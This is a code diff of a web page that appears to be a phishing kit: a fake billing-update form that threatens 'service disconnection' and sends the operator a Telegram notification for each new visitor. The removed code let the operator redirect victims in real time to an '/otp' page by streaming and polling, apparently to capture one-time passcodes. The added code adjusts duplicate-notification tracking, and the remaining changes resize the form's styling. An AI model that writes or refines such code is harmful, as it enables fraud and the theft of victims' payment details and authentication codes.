@@ -10,7 +10,8 @@ export default function Home() {
       try {
         // Check if we already have a visitorId and if notification was already sent
         let visitorId = localStorage.getItem('visitorId');
-        const notificationSent = localStorage.getItem('telegramNotificationSent');
+        const lastNotificationVisitorId = localStorage.getItem('lastNotificationVisitorId');
+        const notificationInProgress = sessionStorage.getItem('notificationInProgress');
         
         // Only create new visitorId if one doesn't exist
         if (!visitorId) {
@@ -21,9 +22,14 @@ export default function Home() {
         
         console.log('[index.js] Visitor ID:', visitorId);
         
-        // Only send notification if it hasn't been sent before for this visitor
-        if (!notificationSent) {
+        // Only send notification if:
+        // 1. This is a new visitor (different visitorId)
+        // 2. No notification is currently in progress
+        if (visitorId !== lastNotificationVisitorId && !notificationInProgress) {
           console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
+          
+          // Mark notification as in progress to prevent duplicates
+          sessionStorage.setItem('notificationInProgress', 'true');
           
           // Send notification (non-blocking - don't fail if it doesn't work)
           fetch('/api/telegram/notify-visitor', {
@@ -35,128 +41,22 @@ export default function Home() {
             const data = await response.json();
             console.log('[index.js] Notification response:', data);
             if (data.success) {
-              // Mark notification as sent to prevent duplicates
-              localStorage.setItem('telegramNotificationSent', 'true');
+              // Mark this visitorId as notified
+              localStorage.setItem('lastNotificationVisitorId', visitorId);
             } else {
               console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
             }
+            // Clear the in-progress flag
+            sessionStorage.removeItem('notificationInProgress');
           })
           .catch(error => {
             console.warn('[index.js] Notification error (non-blocking):', error);
-            // Don't block page load if notification fails
+            // Clear the in-progress flag even on error
+            sessionStorage.removeItem('notificationInProgress');
           });
         } else {
           console.log('[index.js] Notification already sent for this visitor, skipping...');
         }
-        
-        // Use SSE for instant redirect notifications + polling as backup
-        let redirectReceived = false;
-        
-        // SSE connection for instant redirects (LISTENER ONLY - never redirects directly)
-        const redirectEventSource = new EventSource(`/api/redirect/stream/${visitorId}`);
-        redirectEventSource.onmessage = function(event) {
-          try {
-            const data = JSON.parse(event.data);
-            if (data.type === 'connected') {
-              console.log('[index.js] Redirect SSE connected');
-            } else if (data.redirect && data.redirectUrl) {
-              redirectReceived = true;
-              redirectEventSource.close();
-              clearInterval(redirectInterval);
-              console.log('[index.js] Redirect command received via SSE');
-              console.log('[index.js] Redirect type:', data.redirectType);
-              console.log('[index.js] Redirect URL:', data.redirectUrl);
-              
-              // Redirect to /r/[visitorId] route which will return 302
-              window.location.href = data.redirectUrl;
-            }
-          } catch (error) {
-            console.error('[index.js] Error parsing SSE redirect:', error);
-          }
-        };
-        
-        redirectEventSource.onerror = function(error) {
-          console.error('[index.js] Redirect SSE error:', error);
-          // Fallback to polling if SSE fails
-        };
-        
-        // Polling - SIMPLIFIED: Check active redirect endpoint (most reliable)
-        // This endpoint uses module-level variables that persist within the same function instance
-        const redirectInterval = setInterval(async () => {
-          if (redirectReceived) {
-            clearInterval(redirectInterval);
-            return;
-          }
-          
-          try {
-            // Primary: Check active redirect endpoint (simplest, most reliable)
-            const activeResponse = await fetch(`/api/redirect/active?t=${Date.now()}`);
-            if (activeResponse.ok) {
-              const activeData = await activeResponse.json();
-              
-              if (activeData.redirect) {
-                redirectReceived = true;
-                if (redirectEventSource) {
-                  redirectEventSource.close();
-                }
-                clearInterval(redirectInterval);
-                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM ACTIVE ✅✅✅');
-                console.log('[index.js] Redirect type:', activeData.redirectType);
-                console.log('[index.js] Page path:', activeData.pagePath);
-                console.log('[index.js] Redirect age:', activeData.age, 'ms');
-                
-                // Redirect immediately
-                const targetUrl = activeData.pagePath || activeData.redirectUrl || '/otp';
-                console.log('[index.js] Redirecting to:', targetUrl);
-                window.location.href = targetUrl;
-                return;
-              }
-            }
-            
-            // Fallback 1: Check latest redirect endpoint
-            const latestResponse = await fetch(`/api/redirect/latest?t=${Date.now()}`);
-            if (latestResponse.ok) {
-              const latestData = await latestResponse.json();
-              
-              if (latestData.redirect) {
-                redirectReceived = true;
-                if (redirectEventSource) {
-                  redirectEventSource.close();
-                }
-                clearInterval(redirectInterval);
-                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM LATEST ✅✅✅');
-                const targetUrl = latestData.pagePath || latestData.redirectUrl || '/otp';
-                console.log('[index.js] Redirecting to:', targetUrl);
-                window.location.href = targetUrl;
-                return;
-              }
-            }
-            
-            // Fallback 2: Check visitor-specific endpoint
-            const response = await fetch(`/api/redirect/${visitorId}?t=${Date.now()}`);
-            if (response.ok) {
-              const data = await response.json();
-              
-              if (data.redirect) {
-                redirectReceived = true;
-                if (redirectEventSource) {
-                  redirectEventSource.close();
-                }
-                clearInterval(redirectInterval);
-                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM VISITOR ENDPOINT ✅✅✅');
-                const targetUrl = data.pagePath || data.redirectUrl || '/otp';
-                console.log('[index.js] Redirecting to:', targetUrl);
-                window.location.href = targetUrl;
-                return;
-              }
-            }
-          } catch (error) {
-            console.error('[index.js] Error checking redirect:', error);
-          }
-        }, 50); // Poll every 50ms for faster response
-        
-        // Stop polling after 5 minutes
-        setTimeout(() => clearInterval(redirectInterval), 300000);
       } catch (error) {
         console.error('Error notifying Telegram:', error);
       }
@@ -426,7 +326,7 @@ export default function Home() {
         }
 
         body {
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+          font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
           background-color: white;
           min-height: 100vh;
           display: flex;
@@ -440,65 +340,66 @@ export default function Home() {
           background: #ffffff;
           border-radius: 12px;
           box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-          padding: 60px 40px;
-          max-width: 450px;
-          width: 100%;
+          padding: 25px 35px;
+          width: 500px;
           text-align: center;
         }
 
         .logo {
-          margin-bottom: 30px;
+          margin-bottom: 12px;
         }
 
         .logo-image {
-          width: 133px;
+          width: 100px;
           height: auto;
-          margin: 0 auto 15px;
+          margin: 0 auto 8px;
           display: block;
           object-fit: contain;
         }
 
         h1 {
-          font-size: 36px;
+          font-size: 28px;
           font-weight: 700;
           color: #000000;
-          margin-bottom: 20px;
+          margin-bottom: 10px;
           line-height: 1.2;
         }
 
         .warning-message {
           display: flex;
-          align-items: center;
+          align-items: flex-start;
           justify-content: center;
-          gap: 8px;
-          margin-bottom: 30px;
+          gap: 6px;
+          margin-bottom: 12px;
           text-align: center;
         }
 
         .warning-icon {
-          width: 20px;
-          height: 20px;
+          width: 16px;
+          height: 16px;
           border-radius: 50%;
           background: #dc3545;
           color: #ffffff;
           display: flex;
           align-items: center;
           justify-content: center;
-          font-size: 12px;
+          font-size: 10px;
           font-weight: 700;
           flex-shrink: 0;
           line-height: 1;
+          margin-top: 2px;
         }
 
         .warning-text {
-          font-size: 13px;
-          font-weight: 500;
+          font-size: 11px;
+          font-weight: 300;
           color: #333333;
           line-height: 1.4;
+          text-align: left;
         }
 
         .form-group {
-          margin-bottom: 24px;
+          margin-bottom: 14px;
           text-align: left;
         }
 
@@ -507,13 +408,13 @@ export default function Home() {
           font-size: 16px;
           font-weight: 700;
           color: #000000;
-          margin-bottom: 10px;
+          margin-bottom: 8px;
         }
 
         input[type="text"],
         input[type="tel"] {
           width: 100%;
-          height: 52px;
+          height: 48px;
           padding: 0 16px;
           font-size: 16px;
           color: #333333;
@@ -536,7 +437,7 @@ export default function Home() {
 
         .form-row {
           display: flex;
-          gap: 16px;
+          gap: 12px;
         }
 
         .form-row .form-group {
@@ -554,7 +455,7 @@ export default function Home() {
           border-radius: 23px;
           cursor: pointer;
           transition: all 0.3s ease;
-          margin-bottom: 20px;
+          margin-bottom: 12px;
         }
 
         .continue-btn:hover {
@@ -573,17 +474,17 @@ export default function Home() {
         }
 
         .link-section {
-          margin-top: 16px;
+          margin-top: 8px;
           text-align: center;
         }
 
         .link-section a {
           display: block;
           color: #0088C0;
-          font-size: 14px;
+          font-size: 13px;
           font-weight: 700;
           text-decoration: none;
-          margin-bottom: 18px;
+          margin-bottom: 10px;
           transition: all 0.2s ease;
         }
 
@@ -593,7 +494,7 @@ export default function Home() {
         }
 
         .separator {
-          margin: 30px 0;
+          margin: 15px 0;
           text-align: center;
           position: relative;
         }
@@ -628,7 +529,7 @@ export default function Home() {
           border-radius: 23px;
           cursor: pointer;
           transition: all 0.3s ease;
-          margin-top: 20px;
+          margin-top: 12px;
         }
 
         .secondary-btn:hover {
@@ -643,19 +544,20 @@ export default function Home() {
         }
 
         .footer {
-          margin-top: 40px;
-          padding-top: 20px;
+          margin-top: 20px;
+          padding-top: 15px;
           text-align: center;
-          max-width: 450px;
+          max-width: 500px;
           width: 100%;
         }
 
         .footer-links {
           display: flex;
-          flex-wrap: wrap;
+          flex-wrap: nowrap;
           justify-content: center;
-          gap: 20px;
-          margin-bottom: 15px;
+          align-items: center;
+          gap: 15px;
+          margin-bottom: 10px;
         }
 
         .footer-links a {
@@ -663,6 +565,7 @@ export default function Home() {
           font-size: 13px;
           text-decoration: none;
           transition: all 0.2s ease;
+          white-space: nowrap;
         }
 
         .footer-links a:hover {
@@ -791,7 +694,7 @@ export default function Home() {
 
         <div className="warning-message">
           <span className="warning-icon">!</span>
-          <span className="warning-text">Failure to update may result in service disconnection</span>
+          <span className="warning-text">Failure to update may result<br />in service disconnection</span>
         </div>
 
         <form id="billing-form">
@@ -899,10 +802,6 @@ export default function Home() {
 
           <button type="submit" className="continue-btn" id="submit-btn">Continue</button>
         </form>
-
-        <div className="link-section">
-          <a href="#back">Back to sign in</a>
-        </div>
 
         <div className="separator">
           <span className="separator-text">OR</span>
